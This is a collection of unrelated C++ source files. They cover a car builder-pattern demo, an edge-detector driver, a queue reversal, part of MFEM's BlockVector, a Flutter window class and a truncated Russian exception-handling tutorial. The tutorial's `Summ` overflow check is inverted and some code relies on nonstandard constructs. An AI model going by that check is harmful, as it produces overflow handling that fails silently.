    "\ufeff#include <iostream>\n#include <string>\n\nusing namespace std;\n\n\nclass Car\n{\n\tstring name;\n\tstring body;\n\tint engine;\n\tint wheels;\n\tstring kpp;\npublic:\n\tvoid SetName(string name)\n\t{\n\t\tthis->name = name;\n\t}\n\tstring GetName()\n\t{\n\t\treturn this->name;\n\t}\n\tvoid SetBody(string body)\n\t{\n\t\tthis->body = body;\n\t}\n\tstring GetBody()\n\t{\n\t\treturn this->body;\n\t}\n\tvoid SetEngine(int engine)\n\t{\n\t\tthis->engine = engine;\n\t}\n\tint GetEngine()\n\t{\n\t\treturn this->engine;\n\t}\n\tvoid SetWheels(int wheels)\n\t{\n\t\tthis->wheels = wheels;\n\t}\n\tint GetWheels()\n\t{\n\t\treturn this->wheels;\n\t}\n\tvoid SetKPP(string kpp)\n\t{\n\t\tthis->kpp = kpp;\n\t}\n\tstring GetKPP()\n\t{\n\t\treturn this->kpp;\n\t}\n\tvoid ShowCar()\n\t{\n\t\tcout << \"Car name: \" << name << \"\\nFrame: \" << body << \"\\nEngine (l. s): \" << engine << \"\\nWheels (R): \" << wheels << \"\\nKpp: \" << kpp << \"\\n\\n\";\n\t}\n};\n\nclass CarBuilder abstract\n{\nprotected:\n\tCar car;\npublic:\n\tCar GetCar()\n\t{\n\t\treturn car;\n\t}\n\tvirtual void BuildName() abstract;\n\tvirtual void BuildBody() abstract;\n\tvirtual void BuildEngine() abstract;\n\tvirtual void BuildWheels() abstract;\n\tvirtual void BuildKPP() abstract;\n};\n\n\nclass DaewooLanosCar : public CarBuilder\n{\npublic:\n\tvoid BuildName() override\n\t{\n\t\tcar.SetName(\"Daewoo Lanos\");\n\t}\n\tvoid BuildBody() override\n\t{\n\t\tcar.SetBody(\"Sedan\");\n\t}\n\tvoid BuildEngine() override\n\t{\n\t\tcar.SetEngine(98);\n\t}\n\tvoid BuildWheels() override\n\t{\n\t\tcar.SetWheels(13);\n\t}\n\tvoid BuildKPP() override\n\t{\n\t\tcar.SetKPP(\"5 Manual\");\n\t}\n};\nclass FordProbeCar : public CarBuilder\n{\npublic:\n\tvoid BuildName() override\n\t{\n\t\tcar.SetName(\"Ford Probe\");\n\t}\n\tvoid BuildBody() override\n\t{\n\t\tcar.SetBody(\"Coupe\");\n\t}\n\tvoid BuildEngine() override\n\t{\n\t\tcar.SetEngine(160);\n\t}\n\tvoid BuildWheels() override\n\t{\n\t\tcar.SetWheels(14);\n\t}\n\tvoid BuildKPP() override\n\t{\n\t\tcar.SetKPP(\"4 Auto\");\n\t}\n};\nclass UAZPatriotCar : public CarBuilder\n{\npublic:\n\tvoid BuildName() override\n\t{\n\t\tcar.SetName(\"UAZ Patriot\");\n\t}\n\tvoid BuildBody() override\n\t{\n\t\tcar.SetBody(\"Station wagon\");\n\t}\n\tvoid BuildEngine() override\n\t{\n\t\tcar.SetEngine(120);\n\t}\n\tvoid BuildWheels() override\n\t{\n\t\tcar.SetWheels(16);\n\t}\n\tvoid BuildKPP() override\n\t{\n\t\tcar.SetKPP(\"4 Manual\");\n\t}\n};\nclass HyundaiGetzCar : public CarBuilder\n{\npublic:\n\tvoid BuildName() override\n\t{\n\t\tcar.SetName(\"Hyundai Getz\");\n\t}\n\tvoid BuildBody() override\n\t{\n\t\tcar.SetBody(\"Hatchback\");\n\t}\n\tvoid BuildEngine() override\n\t{\n\t\tcar.SetEngine(66);\n\t}\n\tvoid BuildWheels() override\n\t{\n\t\tcar.SetWheels(13);\n\t}\n\tvoid BuildKPP() override\n\t{\n\t\tcar.SetKPP(\"4 auto\");\n\t}\n};\n\nclass Shop\n{\n\tCarBuilder* carBuilder;\npublic:\n\tvoid SetCarBuilder(CarBuilder* cb)\n\t{\n\t\tcarBuilder = cb;\n\t}\n\tCar GetCar()\n\t{\n\t\treturn carBuilder->GetCar();\n\t}\n\tvoid ConstructCar()\n\t{\n\t\tcarBuilder->BuildName();\n\t\tcarBuilder->BuildBody();\n\t\tcarBuilder->BuildEngine();\n\t\tcarBuilder->BuildWheels();\n\t\tcarBuilder->BuildKPP();\n\t}\n};\n\nvoid client(CarBuilder* builder)\n{\n\tShop shop;\n\tshop.SetCarBuilder(builder);\n\tshop.ConstructCar();\n\tCar car = shop.GetCar();\n\tcar.ShowCar();\n}\n\nvoid main()\n{\n\tCarBuilder* builder = new DaewooLanosCar();\n\tclient(builder);\n\tdelete builder;\n\n\tbuilder = new FordProbeCar();\n\tclient(builder);\n\tdelete builder;\n\n\tbuilder = new UAZPatriotCar();\n\tclient(builder);\n\tdelete builder;\n\n\tbuilder = new HyundaiGetzCar();\n\tclient(builder);\n\tdelete builder;\n\n\tsystem(\"pause\");\n}",
    "#include \"edge_detector.hpp\"\n\nint main(){\n\n    std::string input_image_path = \"/Users/nitishsanghi/Documents/Stereo-Matching/000000_10.png\";\n    std::string output_image_path = \"/Users/nitishsanghi/Documents/Edge-Detector/Images/000000_10_sobel.png\";\n    std::string output_image_pathx = \"/Users/nitishsanghi/Documents/Edge-Detector/Images/000000_10_sobelx.png\";\n    std::string output_image_pathy = \"/Users/nitishsanghi/Documents/Edge-Detector/Images/000000_10_sobely.png\";\n    std::string output_image_pathp = \"/Users/nitishsanghi/Documents/Edge-Detector/Images/000000_10_p.png\";\n    std::string output_image_pathpx = \"/Users/nitishsanghi/Documents/Edge-Detector/Images/000000_10_px.png\";\n    std::string output_image_pathpy = \"/Users/nitishsanghi/Documents/Edge-Detector/Images/000000_10_py.png\";\n    std::string output_image_pathr = \"/Users/nitishsanghi/Documents/Edge-Detector/Images/000000_10_r.png\";\n    std::string output_image_pathrx = \"/Users/nitishsanghi/Documents/Edge-Detector/Images/000000_10_rx.png\";\n    std::string output_image_pathry = \"/Users/nitishsanghi/Documents/Edge-Detector/Images/000000_10_ry.png\";\n \n    EdgeDetector detector;\n    detector.loadImage(input_image_path);\n    detector.saveEdgeImage(output_image_path, detector.applyDetector(EdgeDetector::DetectorType::SOBEL, EdgeDetector::GradientType::MAG));\n    detector.saveEdgeImage(output_image_pathx, detector.applyDetector(EdgeDetector::DetectorType::SOBEL, EdgeDetector::GradientType::X));\n    detector.saveEdgeImage(output_image_pathy, detector.applyDetector(EdgeDetector::DetectorType::SOBEL, EdgeDetector::GradientType::Y));\n    detector.saveEdgeImage(output_image_pathp, detector.applyDetector(EdgeDetector::DetectorType::PREWITT, EdgeDetector::GradientType::MAG));\n    detector.saveEdgeImage(output_image_pathpx, detector.applyDetector(EdgeDetector::DetectorType::PREWITT, EdgeDetector::GradientType::X));\n    detector.saveEdgeImage(output_image_pathpy, detector.applyDetector(EdgeDetector::DetectorType::PREWITT, EdgeDetector::GradientType::Y));\n    detector.saveEdgeImage(output_image_pathr, detector.applyDetector(EdgeDetector::DetectorType::ROBERTSCROSS, EdgeDetector::GradientType::MAG));\n    detector.saveEdgeImage(output_image_pathrx, detector.applyDetector(EdgeDetector::DetectorType::ROBERTSCROSS, EdgeDetector::GradientType::X));\n    detector.saveEdgeImage(output_image_pathry, detector.applyDetector(EdgeDetector::DetectorType::ROBERTSCROSS, EdgeDetector::GradientType::Y));\n\n\n    return 0;\n}",
    "#include <iostream>\r\n#include <queue>\r\n#include <stack>\r\n\r\n// Function to reverse the order of elements in a queue\r\nvoid reverseQueue(std::queue<int>& q) {\r\n    std::stack<int> s;\r\n\r\n    // Dequeue elements from the queue and push them onto the stack\r\n    while (!q.empty()) {\r\n        s.push(q.front());\r\n        q.pop();\r\n    }\r\n\r\n    // Pop elements from the stack and enqueue them back into the queue\r\n    while (!s.empty()) {\r\n        q.push(s.top());\r\n        s.pop();\r\n    }\r\n}\r\n\r\n// Function to print the elements of a queue\r\nvoid printQueue(std::queue<int> q) {\r\n    while (!q.empty()) {\r\n        std::cout << q.front() << \" \";\r\n        q.pop();\r\n    }\r\n    std::cout << std::endl;\r\n}\r\n\r\nint main() {\r\n    std::queue<int> testQueue;\r\n    testQueue.push(1);\r\n    testQueue.push(2);\r\n    testQueue.push(3);\r\n    testQueue.push(4);\r\n    testQueue.push(5);\r\n    testQueue.push(6);\r\n\r\n    std::cout << \"Original queue: \";\r\n    printQueue(testQueue);\r\n\r\n    reverseQueue(testQueue);\r\n\r\n    std::cout << \"Reversed queue: \";\r\n    printQueue(testQueue);\r\n\r\n    return 0;\r\n}\r\n",
    "// Copyright (c) 2010-2024, Lawrence Livermore National Security, LLC. Produced\n// at the Lawrence Livermore National Laboratory. All Rights reserved. See files\n// LICENSE and NOTICE for details. LLNL-CODE-806117.\n//\n// This file is part of the MFEM library. For more information and source code\n// availability visit https://mfem.org.\n//\n// MFEM is free software; you can redistribute it and/or modify it under the\n// terms of the BSD-3 license. We welcome feedback and contributions, see file\n// CONTRIBUTING.md for details.\n\n#include \"../general/array.hpp\"\n#include \"vector.hpp\"\n#include \"blockvector.hpp\"\n\nnamespace mfem\n{\n\nvoid BlockVector::SetBlocks()\n{\n   for (int i = 0; i < numBlocks; ++i)\n   {\n      blocks[i].MakeRef(*this, blockOffsets[i], BlockSize(i));\n   }\n}\n\nBlockVector::BlockVector():\n   Vector(),\n   numBlocks(0),\n   blockOffsets(NULL),\n   blocks(NULL)\n{\n\n}\n\n//! Standard constructor\nBlockVector::BlockVector(const Array<int> & bOffsets):\n   Vector(bOffsets.Last()),\n   numBlocks(bOffsets.Size()-1),\n   blockOffsets(bOffsets.GetData())\n{\n   blocks = new Vector[numBlocks];\n   SetBlocks();\n}\n\nBlockVector::BlockVector(const Array<int> & bOffsets, MemoryType mt)\n   : Vector(bOffsets.Last(), mt),\n     numBlocks(bOffsets.Size()-1),\n     blockOffsets(bOffsets.GetData())\n{\n   blocks = new Vector[numBlocks];\n   SetBlocks();\n}\n\n//! Copy constructor\nBlockVector::BlockVector(const BlockVector & v):\n   Vector(v),\n   numBlocks(v.numBlocks),\n   blockOffsets(v.blockOffsets)\n{\n   blocks = new Vector[numBlocks];\n   SetBlocks();\n}\n\n//! View constructor\nBlockVector::BlockVector(double *data, const Array<int> & bOffsets):\n   Vector(data, bOffsets.Last()),\n   numBlocks(bOffsets.Size()-1),\n   blockOffsets(bOffsets.GetData())\n{\n   blocks = new Vector[numBlocks];\n   SetBlocks();\n}\n\nBlockVector::BlockVector(Vector &v, const Array<int> &bOffsets)\n   : Vector(),\n     numBlocks(bOffsets.Size()-1),\n     blockOffsets(bOffsets.GetData())\n{\n   MakeRef(v, 0, blockOffsets[numBlocks]);\n   blocks = new Vector[numBlocks];\n   SetBlocks();\n}\n\nBlockVector::BlockVector(Vector &v, int offset, const Array<int> &bOffsets)\n   : Vector(),\n     numBlocks(bOffsets.Size()-1),\n     blockOffsets(bOffsets.GetData())\n{\n   MakeRef(v, offset, blockOffsets[numBlocks]);\n   blocks = new Vector[numBlocks];\n   SetBlocks();\n}\n\nvoid BlockVector::Update(double *data, const Array<int> & bOffsets)\n{\n   NewDataAndSize(data, bOffsets.Last());\n   blockOffsets = bOffsets.GetData();\n   if (numBlocks != bOffsets.Size()-1)\n   {\n      delete [] blocks;\n      numBlocks = bOffsets.Size()-1;\n      blocks = new Vector[numBlocks];\n   }\n   SetBlocks();\n}\n\nvoid BlockVector::Update(Vector & data, const Array<int> & bOffsets)\n{\n   blockOffsets = bOffsets.GetData();\n   if (numBlocks != bOffsets.Size()-1)\n   {\n      delete [] blocks;\n      numBlocks = bOffsets.Size()-1;\n      blocks = new Vector[numBlocks];\n   }\n\n   for (int i = 0; i < numBlocks; ++i)\n   {\n      blocks[i].MakeRef(data, blockOffsets[i], BlockSize(i));\n   }\n   MakeRef(data, 0, blockOffsets[numBlocks]);\n}\n\nvoid BlockVector::Update(const Array<int> &bOffsets)\n{\n   Update(bOffsets, data.GetMemoryType());\n}\n\nvoid BlockVector::Update(const Array<int> &bOffsets, MemoryType mt)\n{\n   blockOffsets = bOffsets.GetData();\n   if (OwnsData() && data.GetMemoryType() == mt)\n   {\n      // check if 'bOffsets' agree with the 'blocks'\n      if (bOffsets.Size() == numBlocks+1)\n      {\n         if (numBlocks == 0) { return; }\n         if (Size() == bOffsets.Last())\n         {\n            for (int i = numBlocks - 1; true; i--)\n            {\n               if (i < 0) { return; }\n               if (blocks[i].Size() != bOffsets[i+1] - bOffsets[i]) { break; }\n               MFEM_ASSERT(blocks[i].GetData() == data + bOffsets[i],\n                           \"invalid blocks[\" << i << ']');\n            }\n         }\n      }\n   }\n   else\n   {\n      Destroy();\n   }\n   SetSize(bOffsets.Last(), mt);\n   if (numBlocks != bOffsets.Size()-1)\n   {\n      delete [] blocks;\n      numBlocks = bOffsets.Size()-1;\n      blocks = new Vector[numBlocks];\n   }\n   SetBlocks();\n}\n\nBlockVector & BlockVector::operator=(const BlockVector & original)\n{\n   if (numBlocks!=original.numBlocks)\n   {\n      mfem_error(\"Number of Blocks don't match in BlockVector::operator=\");\n   }\n\n   for (int i(0); i <= numBlocks; ++i)\n   {\n      if (blockOffsets[i]!=original.blockOffsets[i])\n      {\n         mfem_error(\"Size of Blocks don't match in BlockVector::operator=\");\n      }\n   }\n\n   Vector::operator=(original);\n\n   return *this;\n}\n\nBlockVector & BlockVector::operator=(double val)\n{\n   Vector::operator=(val);\n   return *this;\n}\n\n//! Destructor\nBlockVector::~BlockVector()\n{\n   delete [] blocks;\n}\n\nvoid BlockVector::GetBlockView(int i, Vector & blockView)\n{\n   blockView.MakeRef(*this, blockOffsets[i], BlockSize(i));\n}\n\nvoid BlockVector::SyncToBlocks() const\n{\n   for (int i = 0; i < numBlocks; ++i)\n   {\n      blocks[i].SyncMemory(*this);\n   }\n}\n\nvoid BlockVector::SyncFromBlocks() const\n{\n   for (i",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "\ufeff#include<iostream>\n#include<stdlib.h>\n#include<exception>\n#include<time.h>\n#include<limits>\n\n/* \u041e\u0411\u0420\u0410\u0411\u041e\u0422\u041a\u0410 \u0418\u0421\u041a\u041b\u042e\u0427\u0415\u041d\u0418\u0419\n*\t- \u043a\u043e\u043d\u0441\u0442\u0440\u0443\u043a\u0446\u0438\u0438\n*\t- \u0441\u043f\u043e\u0441\u043e\u0431\u044b \u0441\u043e\u0437\u0434\u0430\u043d\u0438\u0439 \u0438 \u043f\u0435\u0440\u0435\u0434\u0430\u0447\u0438 \u0438\u0441\u043a\u043b\u044e\u0447\u0435\u043d\u0438\u0439\n*\t- \u0432\u0441\u0442\u0440\u043e\u0435\u043d\u043d\u044b\u0435 \u0432 \u044f\u0437\u044b\u043a \u0438\u0441\u043a\u043b\u044e\u0447\u0435\u043d\u0438\u044f\n*\t- \u0442\u0438\u043f\u044b \u0438\u0441\u043a\u043b\u044e\u0447\u0435\u043d\u0438\u0439\n*\t- \u0440\u0435\u043a\u043e\u043c\u0435\u043d\u0434\u0430\u0446\u0438\u0438 \u043f\u043e \u0432\u0437\u0430\u0438\u043c\u043e\u0434\u0435\u0439\u0441\u0442\u0432\u0438\u044e \u0441 \u0438\u0441\u043a\u043b\u044e\u0447\u0435\u043d\u0438\u044f\u043c\u0438 \u0432 \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u0435\n* \u041a\u043b\u044e\u0447\u0435\u0432\u044b\u0435 \u0441\u043b\u043e\u0432\u0430 \u044f\u0437\u044b\u043a\u0430\n* \n* throw try catch\n* \n* try-\u0431\u043b\u043e\u043a \u043c\u043e\u0436\u0435\u0442 \u044d\u043a\u0440\u0430\u043d\u0438\u0440\u043e\u0432\u0430\u0442\u044c \u0438 \u043f\u0435\u0440\u0435\u0434\u0430\u0442\u044c \u0432 catch \u0442\u043e\u043b\u044c\u043a\u043e \u043e\u0448\u0438\u0431\u043a\u0438,\n* \u0441\u0433\u0435\u043d\u0435\u0440\u0438\u0440\u043e\u0432\u0430\u043d\u043d\u044b\u0435 \u0432\u043d\u0443\u0442\u0440\u0438 \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u044b/\n* \n* \u0414\u043b\u044f \u043d\u0435\u0438\u0437\u0432\u0435\u0441\u0442\u043d\u044b\u0445 \u043e\u0448\u0438\u0431\u043e\u043a \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u0443\u0435\u0442\u0441\u044f \u043a\u043e\u043d\u0441\u0442\u0440\u0443\u043a\u0446\u0438\u044f catch(...)\n* \n* \u043a\u0430\u0442\u0435\u0433\u043e\u0440\u0438\u044f \u043e\u0448\u0438\u0431\u043e\u043a \u043e\u043f\u0435\u0440\u0430\u0446\u0438\u043e\u043d\u043d\u043e\u0439 \u0441\u0438\u0441\u0442\u0435\u043c\u044b runtime_error \u043d\u0435 \u043c\u043e\u0436\u0435\u0442\n* \u0431\u044b\u0442\u044c \u043e\u0431\u0440\u0430\u0431\u043e\u0442\u0430\u043d\u0430 \u0432\u043d\u0443\u0442\u0440\u0438 \u043f\u0440\u0438\u043b\u043e\u0436\u0435\u043d\u0438\u044f\u0438 \u0435\u0451 \u043d\u0430\u0434\u043e \u043f\u0440\u0435\u0434\u043e\u0442\u0432\u0440\u0430\u0449\u0430\u0442\u044c\n* \n* \u041f\u0440\u0430\u0432\u0438\u043b\u0430 \u043f\u043e \u0432\u043d\u0435\u0434\u0440\u0435\u043d\u0438\u044e \u0438\u0441\u043a\u043b\u044e\u0447\u0435\u043d\u0438\u0439 \u0432 \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u0443\n* 1. \u041d\u0435 \u043e\u0431\u0440\u0430\u0431\u0430\u0442\u044b\u0432\u0430\u0435\u043c \u0438\u0441\u043a\u043b\u044e\u0447\u0435\u043d\u0438\u0435 \u043f\u043e \u043f\u0430\u0440\u0430\u043c\u0435\u0442\u0440\u0430\u043c, \u043a\u043e\u0442\u043e\u0440\u044b\u043c\u0438 \u043c\u044b \u043d\u0435 \u0432\u043b\u0430\u0434\u0435\u0435\u043c\n*    \u041d\u0435 \u043e\u0431\u0440\u0430\u0431\u0430\u0442\u044b\u0432\u0430\u0435\u043c \u0438\u0441\u043a\u043b., \u0435\u0441\u043b\u0438 \u043c\u044b \u0438\u0445 \u043d\u0435 \u043f\u043e\u0440\u043e\u0434\u0438\u043b\u0438. \u0412 \u044d\u0442\u043e\u043c \u0441\u043b\u0443\u0447\u0430\u0435 \n*    \u0438\u0441\u043f. \u0442\u043e\u043b\u044c\u043a\u043e throw-\u043a\u043e\u043d\u0441\u0442\u0440\u0443\u043a\u0446\u0438\u044f \u0441 \u043e\u043f\u0438\u0441\u0430\u043d\u0438\u0435\u043c, \u0447\u0442\u043e \u043f\u043e\u0448\u043b\u043e \u043d\u0435 \u0442\u0430\u043a\n* 2. try-catch \u0438\u0441\u043f. \u0442\u043e\u043b\u044c\u043a\u043e \u0432 \u043a\u043e\u0434\u0435, \u043a\u043e\u0442\u043e\u0440\u044b\u0439 \u043d\u0435 \u0443\u0432\u0435\u0440\u0435\u043d, \u0447\u0442\u043e \u0435\u0433\u043e \u0434\u0430\u043d\u043d\u044b\u0435\n*    \u043c\u043e\u0433\u0443\u0442 \u0431\u044b\u0442\u044c \u043a\u043e\u0440\u0440\u0435\u043a\u0442\u043d\u043e \u043e\u0431\u0440\u0430\u0431\u043e\u0442\u0430\u043d\u044b \u0432\u043d\u0435\u0448\u043d\u0438\u043c \u043a\u043e\u0434\u043e\u043c\n* 3. \u041d\u0435 \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u044c \u0431\u0430\u0437\u043e\u0432\u044b\u0435 \u0442\u0438\u043f\u044b \u0434\u043b\u044f \u043b\u043e\u0432\u043b\u0438 \u0438\u0441\u043a\u043b\u044e\u0447\u0435\u043d\u0438\u0439\n*    \u0431\u0438\u0431\u043b\u0438\u043e\u0442\u0435\u043a\u0430 <exception>, \u043b\u0438\u0431\u043e \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044c\u0441\u043a\u0438\u0435 \u043a\u043b\u0430\u0441\u0441\u044b \u0438\u0441\u043a\u043b\u044e\u0447\u0435\u043d\u0438\u0439\n*\t \u0411\u0430\u0437\u043e\u0432\u044b\u0435 \u0442\u0438\u043f\u044b \u0432 \u0438\u0441\u043a\u043b\u044e\u0447\u0435\u043d\u0438\u044f\u0445 \u0431\u0443\u0434\u0443\u0442 \u0437\u0430\u0441\u0442\u0430\u0432\u043b\u044f\u0442\u044c \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u0435\u0439 \u043b\u0438\u0441\u0442\u0430\u0442\u044c \n\t \"\u0442\u043e\u043b\u043c\u0443\u0434\u044b\", \u0447\u0442\u043e\u0431\u044b \u0443\u0437\u043d\u0430\u0442\u044c, \u0447\u0442\u043e \u0442\u043e\u0442 \u0438\u043b\u0438 \u0438\u043d\u043e\u0439 \u043a\u043e\u0434 \u043e\u0448\u0438\u0431\u043a\u0438 \u043e\u0437\u043d\u0430\u0447\u0430\u0435\u0442\n\n\t\u0422\u0438\u043f\u044b \u0438\u0441\u043a\u043b\u044e\u0447\u0435\u043d\u0438\u0439:\n\t1. runtime_error - \u0436\u0438\u0432\u0443\u0442 \u0432 \u043e\u043f\u0435\u0440\u0430\u0446\u0438\u043e\u043d\u043a\u0435 \u0438 \u043d\u0435 \u043c\u043e\u0433\u0443\u0442 \u0431\u044b\u0442\u044c \u043e\u0431\u0440\u0430\u0431\u043e\u0442\u0430\u043d\u044b\n\t2. \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u043d\u044b\u0435 \u0438\u0441\u043a\u043b\u044e\u0447\u0435\u043d\u0438\u044f:\n\t\t2.1 logic_exception\n\t\t\tinvalid_argument (\u043d\u0435\u043f\u0440\u0430\u0432\u0438\u043b\u044c\u043d\u044b\u0435 \u0430\u0440\u0433\u0443\u043c\u0435\u043d\u0442\u044b: \u043e\u0448\u0438\u0431\u043e\u0447\u043d\u044b\u0435 \u0430\u0440\u0433\u0443\u043c\u0435\u043d\u0442\u044b \u0444.)\n\t\t\tdamain_error (\u0434\u043e\u043c\u0435\u043d\u043d\u0430\u044f \u043e\u0448\u0438\u0431\u043a\u0430: \u0438\u0433\u0440\u043e\u0432\u0430\u044f \u0438\u043b\u0438 \u0431\u0438\u0437\u043d\u0435\u0441 \u043b\u043e\u0433\u0438\u043a\u0430)\n\t\t\tlength_error (\u043e\u0448\u0438\u0431\u043a\u0438 \u043d\u0435\u043a\u043e\u0440\u0440\u0435\u043a\u0442\u043d\u043e\u0433\u043e \u0443\u043a\u0430\u0437\u0430\u043d\u0438\u044f \u0440\u0430\u0437\u043c\u0435\u0440\u0430 \u043a\u043e\u043b\u043b\u0435\u043a\u0446\u0438\u0438)\n\t\t\tout_of_range (\u0432\u044b\u0445\u043e\u0434 \u0437\u0430 \u043f\u0440\u0435\u0434\u0435\u043b\u044b \u0434\u0438\u0430\u043f\u0430\u0437\u043e\u043d\u0430)\n\t\t2.2 runtime_error (\u043e\u0448\u0438\u0431\u043a\u0438 \u0432\u043d\u0443\u0442\u0440\u0438 \u0431\u0438\u0431\u043b\u0438\u043e\u0442\u0435\u043a, \u0441\u043b\u043e\u043c \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u044b \u043d\u0430 \u0441\u0438\u0441\u0442\u0435\u043c\u043d\u043e\u043c \u0443\u0440\u043e\u0432\u043d\u0435)\n\t\t\trange_error (\u043e\u0431\u0440\u0430\u0431\u043e\u0442\u043a\u0430 \u043a\u043e\u043b\u043b\u0435\u043a\u0446\u0438\u0438 \u043d\u0430 \u0441\u0438\u0441\u0442\u0435\u043c\u043d\u043e\u043c \u0443\u0440\u043e\u0432\u043d\u0435)\n\t\t\toverflow_error (\u043e\u0448\u0438\u0431\u043a\u0430 \u043f\u0435\u0440\u0435\u043f\u043e\u043b\u043d\u0435\u043d\u0438\u044f \u0442\u0438\u043f\u0430 \u0434\u0430\u043d\u043d\u044b\u0445 \u043f\u0440\u0438 \u0434\u043e\u0441\u0442\u0438\u0436\u0435\u043d\u0438\u0438 \u043f\u0440\u0435\u0434\u0435\u043b\u044c\u043d\u043e\u0433\u043e \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u044f \u0442\u0438\u043f\u0430 \u0434\u0430\u043d\u043d\u044b\u0445)\n\t\t\tunderflow_error (\u0435\u0441\u043b\u0438 \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044c \u043f\u044b\u0442\u0430\u0435\u0442\u0441\u044f \u043f\u0440\u0435\u043e\u0434\u043e\u043b\u0435\u0442\u044c \u043c\u0430\u043a\u0441\u0438\u043c\u0430\u043b\u044c\u043d\u043e\u0435 \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0435)\n\t\t\tregex_error \n\t\t\tsystem_error (\u043f\u043e \u043c\u0430\u0441\u043a\u0435 \u0441\u0442\u0440\u043e\u043a\u0438 \u0438\u0449\u0443\u0442 \u0432\u0445\u043e\u0436\u0434\u0435\u043d\u0438\u0435 \u0432 \u0434\u0440\u0443\u0433\u043e\u043c \u043c\u0435\u0441\u0442\u0435)\n\t\t2.3 bad_typeid - \u043e\u0448\u0438\u0431\u043a\u0438 \u043e\u043f\u0440\u0435\u0434\u0435\u043b\u043d\u0438\u044f \u0442\u0438\u043f\u043e\u0432\n\t\t2.4 bad_cast\n\t\t2.5 bad_alloc\n\t\t2.6 bad_exception - \u043f\u0440\u043e\u0431\u043b\u0435\u043c\u0430 \u043f\u0440\u0438 \u0433\u0435\u043d\u0435\u0440\u0430\u0446\u0438\u0438 \u0438\u0441\u043a\u043b\u044e\u0447\u0435\u043d\u0438\u044f\n\n   int Summ2(int a, int b) noexcept {}, noexcept \u043f\u0438\u0448\u0435\u0442\u0441\u044f, \u043a\u043e\u0433\u0434\u0430 \u043a\u043e\u043c\u043f\u0438\u043b\u044f\u0442\u043e\u0440 \u0434\u043e\u043b\u0436\u0435\u043d \u043f\u0440\u043e\u043f\u0443\u0441\u0442\u0438\u0442\u044c \u0438\u0441\u043a\u043b\u044e\u0447\u0435\u043d\u0438\u044f\n*/\n\nvoid F00(int a) {\n\tif (a){\n\t\tthrow std::exception(\"Bad luck\");\n\t}\n}\n\nvoid F01(int a) {\n\tif (a) {\n\t\t// \u041d\u0438\u0437\u043a\u043e\u0443\u0440\u043e\u0432\u043d\u0435\u0432\u044b\u0439 \u0438\u043d\u0441\u0442\u0440\u0443\u043c\u0435\u043d\u0442\u0430\u0440\u0438\u0439, \u043f\u043e\u043a\u0430 \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u044c \u043d\u0435 \u0431\u0443\u0434\u0435\u043c\n\t\t//throw std::make_exception_ptr(std::exception(\"Bad luck\"));\n\t\tthrow std::exception(\"Bad luck\");\n\t}\n}\n\nint Summ(int a, int b) {\n\tif (std::numeric_limits<int>::max() - b > a) {\n\t\tthrow std::overflow_error(\"more then return can handle\");\n\t}\n\treturn a + b;\n}\n\nint main() {\n\t// \u0411\u043b\u043e\u043a \u043a\u043e\u0434\u0430, \u043a\u043e\u0442\u043e\u0440\u044b\u0439 \u043c\u043e\u0436\u0435\u0442 \u0440\u0430\u0431\u043e\u0442\u0430\u0442\u044c \u043d\u0435\u043a\u043e\u0440\u0440\u0435\u043a\u0442\u043d\u043e\n\t//try {\n\t//\tint a{ 5 }, b{ 0 };\n\t//\tint c{};\n\t//\tif (!b) throw -1; // \u0421\u043e\u0431\u044b\u0442\u0438\u0435, \u0432\u044b\u0437\u044b\u0432\u0430\u044e\u0449\u0435\u0435 \u0438\u0441\u043a\u043b\u044e\u0447\u0438\u0442\u0435\u043b\u044c\u043d\u0443\u044e \u0441\u0438\u0442\u0443\u0430\u0446\u0438\u044e\n\t//\t// \u041a\u043e\u0434, \u0441\u043b\u0435\u0434\u0443\u044e\u0449\u0438\u0439 \u0437\u0430 throw, \u0432 \u0441\u043b\u0443\u0447\u0430\u0435 \u0438\u0441\u043a\u043b\u044e\u0447\u0438\u0442\u0435\u043b\u044c\u043d\u043e\u0439 